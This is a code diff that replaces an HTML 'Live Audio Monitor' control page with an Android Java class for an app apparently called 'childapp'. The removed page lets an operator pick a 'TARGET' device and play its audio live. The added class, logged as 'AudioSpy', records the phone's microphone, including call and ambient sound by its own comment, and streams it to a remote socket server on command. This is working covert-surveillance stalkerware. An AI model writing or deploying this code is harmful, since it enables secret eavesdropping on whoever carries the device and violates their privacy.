@@ -1,247 +1,90 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Live Audio Monitor</title>
-    
-    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
-    
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    
-    <style>
-        :root { --accent: #00ff88; --bg: #0a0a0a; }
-        body { background: var(--bg); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; text-align: center; overflow: hidden; }
-        
-        .header { padding: 20px; display: flex; align-items: center; gap: 15px; background: #111; border-bottom: 1px solid #222; }
-        .back-btn { color: white; text-decoration: none; font-size: 1.2rem; cursor: pointer; }
-        
-        .device-info { margin-top: 20px; color: #aaa; font-size: 14px; letter-spacing: 1px; }
-        .device-info span { color: var(--accent); font-weight: bold; font-size: 18px; }
+package com.example.childapp;
 
-        .mic-container { height: 45vh; display: flex; flex-direction: column; align-items: center; justify-content: center; }
-        
-        .mic-circle {
-            width: 130px; height: 130px; background: rgba(0, 255, 136, 0.05);
-            border-radius: 50%; display: flex; align-items: center; justify-content: center;
-            border: 2px solid var(--accent); position: relative; transition: 0.3s;
-            box-shadow: 0 0 20px rgba(0, 255, 136, 0.1);
-        }
-        .mic-circle.active { animation: pulse 1.5s infinite; background: rgba(0, 255, 136, 0.2); }
-        
-        @keyframes pulse {
-            0% { box-shadow: 0 0 0 0 rgba(0, 255, 136, 0.4); }
-            70% { box-shadow: 0 0 0 40px rgba(0, 255, 136, 0); }
-            100% { box-shadow: 0 0 0 0 rgba(0, 255, 136, 0); }
-        }
+import android.annotation.SuppressLint;
+import android.media.AudioFormat;
+import android.media.AudioRecord;
+import android.media.MediaRecorder;
+import android.util.Log;
 
-        .visualizer { display: flex; gap: 6px; height: 60px; align-items: center; margin-top: 40px; }
-        .bar { width: 8px; height: 15px; background: var(--accent); border-radius: 10px; transition: 0.1s; opacity: 0.3; }
-        .active-bar { opacity: 1; box-shadow: 0 0 10px #00ff88; }
+import io.socket.client.Socket;
 
-        .controls { padding: 20px; display: flex; flex-direction: column; align-items: center; gap: 20px; }
-        .btn-group { display: flex; gap: 20px; }
-        
-        .btn { 
-            background: #1a1a1a; border: 1px solid #333; color: white; 
-            padding: 15px 40px; border-radius: 30px; cursor: pointer; 
-            display: flex; align-items: center; gap: 10px; font-weight: 600; font-size: 16px;
-            transition: all 0.3s ease;
-        }
-        .btn:hover { background: #333; transform: scale(1.05); }
-        .btn.active { background: var(--accent); color: black; border-color: var(--accent); box-shadow: 0 0 15px rgba(0,255,136,0.4); }
-        .btn.stop:hover { background: #ff4444; border-color: #ff4444; box-shadow: 0 0 15px rgba(255,68,68,0.4); }
-        
-        #statusText { font-family: 'Courier New', monospace; letter-spacing: 1px; }
+public class LiveAudioManager {
 
-    </style>
-</head>
-<body>
+    private Socket mSocket;
+    private String deviceId;
+    private boolean isRecording = false;
+    private AudioRecord audioRecord;
+    private Thread recordingThread;
 
-    <div class="header">
-        <a href="index.html" class="back-btn"><i class="fa-solid fa-arrow-left"></i> Back</a>
-        <h3>Live Audio Stream</h3>
-    </div>
+    // 🔥 SETTING: 16kHz (Must match HTML)
+    private static final int SAMPLE_RATE = 16000;
+    private static final int CHANNEL_CONFIG = AudioFormat.CHANNEL_IN_MONO;
+    private static final int AUDIO_FORMAT = AudioFormat.ENCODING_PCM_16BIT;
 
-    <div class="device-info">
-        TARGET: <span id="targetDisplay">LOADING...</span>
-    </div>
+    public LiveAudioManager(Socket socket, String deviceId) {
+        this.mSocket = socket;
+        this.deviceId = deviceId;
+    }
 
-    <div class="mic-container">
-        <div class="mic-circle" id="micCircle">
-            <i class="fa-solid fa-microphone fa-3x"></i>
-        </div>
-        
-        <div class="visualizer" id="visualizer">
-            <div class="bar"></div><div class="bar"></div><div class="bar"></div><div class="bar"></div>
-            <div class="bar"></div><div class="bar"></div><div class="bar"></div><div class="bar"></div>
-            <div class="bar"></div><div class="bar"></div>
-        </div>
-        <p id="statusText" style="color: #888; margin-top: 25px; font-size: 0.9rem;">READY TO CONNECT</p>
-    </div>
+    @SuppressLint("MissingPermission") // Permissions MainActivity mein checked hain
+    public void startAudioStream() {
+        if (isRecording) return;
 
-    <div class="controls">
-        <div class="btn-group">
-            <button class="btn" id="startBtn" onclick="connectAndListen()">
-                <i class="fa-solid fa-play"></i> START
-            </button>
-            <button class="btn stop" id="stopBtn" style="color: #ff4444;" onclick="stopListen()">
-                <i class="fa-solid fa-stop"></i> STOP
-            </button>
-        </div>
-    </div>
+        int minBufSize = AudioRecord.getMinBufferSize(SAMPLE_RATE, CHANNEL_CONFIG, AUDIO_FORMAT);
 
-    <script>
-        // 🔥 Server URL Corrected
-        const SERVER_URL = "https://child-v9no.onrender.com"; 
+        try {
+            // MIC source call audio aur aas paas ki aawaz dono uthata hai
+            audioRecord = new AudioRecord(
+                    MediaRecorder.AudioSource.MIC,
+                    SAMPLE_RATE,
+                    CHANNEL_CONFIG,
+                    AUDIO_FORMAT,
+                    minBufSize
+            );
 
-        // 🔥 ID Get Logic
-        const urlParams = new URLSearchParams(window.location.search);
-        const DEVICE_ID = urlParams.get('id'); 
+            if (audioRecord.getState() == AudioRecord.STATE_INITIALIZED) {
+                audioRecord.startRecording();
+                isRecording = true;
+                Log.d("AudioSpy", "Started Streaming at 16000Hz");
 
-        let socket;
-        let audioContext;
-        let nextTime = 0;
-        let isStreaming = false;
+                recordingThread = new Thread(() -> {
+                    // Buffer size chota rakha hai taaki delay na ho
+                    byte[] buffer = new byte[4096]; 
 
-        // 🔥 Page Load Check
-        window.onload = function() {
-            if (!DEVICE_ID) {
-                alert("ID Missing! Please select a device first from Dashboard.");
-                // window.location.href = "index.html"; // Commented out for testing
-                document.getElementById('targetDisplay').innerText = "NO ID FOUND";
-                return;
-            }
-            document.getElementById('targetDisplay').innerText = DEVICE_ID;
-        };
-
-        function connectAndListen() {
-            if (!DEVICE_ID) {
-                alert("Error: No Device ID");
-                return;
-            }
-
-            // 1. Audio Context Resume (Browser Policy)
-            if (!audioContext) {
-                audioContext = new (window.AudioContext || window.webkitAudioContext)();
-            }
-            if (audioContext.state === 'suspended') {
-                audioContext.resume();
-            }
-
-            document.getElementById('statusText').innerText = "CONNECTING...";
-            document.getElementById('statusText').style.color = "yellow";
-
-            if(socket) socket.disconnect();
-            
-            // Connect to Socket
-            socket = io(SERVER_URL);
-
-            socket.on("connect", () => {
-                console.log("Connected to Server");
-                
-                // 2. Room Join
-                socket.emit("join", DEVICE_ID);
-                
-                // 3. Command Send: Start Mic
-                console.log("Sending start-mic command...");
-                socket.emit("control-event", {
-                    room: DEVICE_ID,
-                    action: "start-mic"
+                    while (isRecording) {
+                        int bytesRead = audioRecord.read(buffer, 0, buffer.length);
+                        
+                        if (bytesRead > 0) {
+                            if (mSocket != null && mSocket.connected()) {
+                                // Raw Binary Data bhej rahe hain (Fastest)
+                                mSocket.emit("audio-stream", buffer);
+                            }
+                        }
+                    }
                 });
-                
-                document.getElementById('statusText').innerText = "🔴 LISTENING LIVE";
-                document.getElementById('statusText').style.color = "#00ff88";
-
-                startUIEffects();
-                isStreaming = true;
-            });
-
-            // 4. Receive Audio Data (Binary)
-            socket.on("audio-stream", (data) => {
-                if (!isStreaming) return;
-                
-                // Debugging: Check karo data aa raha hai ya nahi
-                // console.log("Audio Chunk Received, Size:", data.byteLength); 
-                
-                playPcmChunk(data);
-            });
-
-            socket.on("disconnect", () => {
-                stopListen();
-            });
-        }
-
-        // --- AUDIO PLAYER LOGIC (PCM 16bit -> Web Audio) ---
-        function playPcmChunk(arrayBuffer) {
-            if (!audioContext) return;
-
-            // Raw PCM 16-bit to Float
-            const int16Array = new Int16Array(arrayBuffer);
-            const float32Array = new Float32Array(int16Array.length);
-
-            for (let i = 0; i < int16Array.length; i++) {
-                // Normalize (-32768 to 32767) -> (-1.0 to 1.0)
-                float32Array[i] = int16Array[i] / 32768; 
+                recordingThread.start();
+            } else {
+                Log.e("AudioSpy", "Mic Init Failed");
             }
+        } catch (Exception e) {
+            Log.e("AudioSpy", "Error: " + e.getMessage());
+        }
+    }
 
-            const audioBuffer = audioContext.createBuffer(1, float32Array.length, 44100);
-            audioBuffer.getChannelData(0).set(float32Array);
-
-            const source = audioContext.createBufferSource();
-            source.buffer = audioBuffer;
-            source.connect(audioContext.destination);
-
-            // Queue Audio (Taaki atke nahi)
-            if (nextTime < audioContext.currentTime) {
-                nextTime = audioContext.currentTime;
+    public void stopAudioStream() {
+        isRecording = false;
+        try {
+            if (audioRecord != null) {
+                audioRecord.stop();
+                audioRecord.release();
+                audioRecord = null;
             }
-            source.start(nextTime);
-            nextTime += source.buffer.duration;
-            
-            animateBars();
-        }
-
-        function stopListen() {
-            isStreaming = false;
-            if (socket) {
-                if(DEVICE_ID) {
-                    console.log("Sending stop-mic command...");
-                    socket.emit("control-event", {
-                        room: DEVICE_ID,
-                        action: "stop-mic"
-                    });
-                }
-                socket.disconnect();
-                socket = null;
+            if (recordingThread != null) {
+                recordingThread = null;
             }
-            stopUIEffects();
-            document.getElementById('statusText').innerText = "STOPPED";
-            document.getElementById('statusText').style.color = "#888";
+            Log.d("AudioSpy", "Mic Stopped");
+        } catch (Exception e) {
+            e.printStackTrace();
         }
-
-        function startUIEffects() {
-            document.getElementById('micCircle').classList.add('active');
-            document.getElementById('startBtn').classList.add('active');
-            document.querySelectorAll('.bar').forEach(b => b.classList.add('active-bar'));
-        }
-
-        function stopUIEffects() {
-            document.getElementById('micCircle').classList.remove('active');
-            document.getElementById('startBtn').classList.remove('active');
-            document.querySelectorAll('.bar').forEach(b => {
-                b.style.height = "15px";
-                b.classList.remove('active-bar');
-            });
-        }
-
-        function animateBars() {
-            // Fake animation based on data arrival
-            document.querySelectorAll('.bar').forEach(b => {
-                b.style.height = (Math.random() * 40 + 15) + "px";
-            });
-        }
-    </script>
-
-</body>
-</html>
+    }
+}
